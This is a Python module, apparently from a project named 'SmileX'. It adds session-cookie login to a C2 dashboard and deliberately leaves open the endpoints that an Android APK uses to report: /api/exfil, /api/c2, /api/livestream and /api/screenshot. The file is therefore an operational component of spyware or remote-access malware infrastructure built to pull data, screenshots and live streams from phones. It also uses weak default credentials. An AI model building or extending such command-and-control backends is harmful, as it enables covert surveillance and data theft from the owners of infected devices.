"""
Simple session-based authentication for the C2 dashboard.
Protects all dashboard routes and REST API endpoints while leaving
agent-facing endpoints (/api/exfil, /api/c2, /health, /ping) open
so the APK can still communicate without authentication.

Credentials are read from environment variables:
  AUTH_USERNAME  — dashboard login username (default: "admin")
  AUTH_PASSWORD  — dashboard login password (default: "changeme")
"""
import os
import hashlib
import secrets
import time
from starlette.requests import Request
from starlette.responses import RedirectResponse, HTMLResponse

# ── Configuration ──────────────────────────────────────────────
AUTH_USERNAME = os.environ.get("AUTH_USERNAME", "admin")
AUTH_PASSWORD = os.environ.get("AUTH_PASSWORD", "changeme")

# In-memory session store (fine for single-server Render free tier)
_sessions: dict[str, float] = {}  # token -> expiry timestamp
SESSION_TTL = 8 * 3600            # 8 hours
LOGIN_PAGE = "/login"


def _hash_password(password: str) -> str:
    """SHA-256 hash for simple comparison (no salt needed — single admin)."""
    return hashlib.sha256(password.encode()).hexdigest()


def create_session() -> str:
    """Create a new session token and return it."""
    token = secrets.token_hex(32)
    _sessions[token] = time.time() + SESSION_TTL
    return token


def validate_session(token: str | None) -> bool:
    """Return True if the token is valid and not expired."""
    if not token:
        return False
    expiry = _sessions.get(token)
    if not expiry or time.time() > expiry:
        _sessions.pop(token, None)
        return False
    return True


def is_authenticated(request: Request) -> bool:
    """Check the session cookie on an incoming request."""
    cookie = request.cookies.get("session")
    return validate_session(cookie)


async def auth_middleware(request: Request, call_next):
    """FastAPI middleware — protect dashboard/API routes, skip agent routes."""
    path = request.url.path

    # These endpoints are open — the APK talks to them without auth
    open_paths = ["/api/exfil", "/api/c2", "/api/livestream", "/api/screenshot",
                  "/health", "/ping", "/login", "/static"]
    if any(path.startswith(p) for p in open_paths):
        return await call_next(request)

    # All other routes require authentication
    if not is_authenticated(request):
        return RedirectResponse(url=LOGIN_PAGE, status_code=303)

    return await call_next(request)


# ── Login page HTML ────────────────────────────────────────────
LOGIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SmileX — Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #0a0a0a; color: #e0e0e0;
            display: flex; align-items: center; justify-content: center;
            min-height: 100vh;
        }
        .login-box {
            background: #111; border: 1px solid #333; border-radius: 12px;
            padding: 40px 50px; width: 380px; text-align: center;
        }
        .login-box h1 { color: #00ff88; font-size: 28px; margin-bottom: 30px; }
        .login-box input {
            width: 100%; padding: 12px 16px; margin-bottom: 16px;
            background: #0a0a0a; border: 1px solid #333; border-radius: 6px;
            color: #e0e0e0; font-size: 15px;
        }
        .login-box input:focus { outline: none; border-color: #00ff88; }
        .login-box button {
            width: 100%; padding: 12px; background: #00ff88; color: #000;
            border: none; border-radius: 6px; font-size: 16px; font-weight: bold;
            cursor: pointer;
        }
        .login-box button:hover { background: #00cc6a; }
        .error { color: #ff4444; font-size: 13px; margin-top: 12px; min-height: 18px; }
        .footer { color: #444; font-size: 11px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>SmileX</h1>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username" autocomplete="off" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <div class="error" id="error">{error_msg}</div>
        <div class="footer">SmileX C2 Dashboard v2.0</div>
    </div>
</body>
</html>
"""


def render_login(error_msg: str = "") -> HTMLResponse:
    return HTMLResponse(content=LOGIN_HTML.replace("{error_msg}", error_msg), status_code=200)
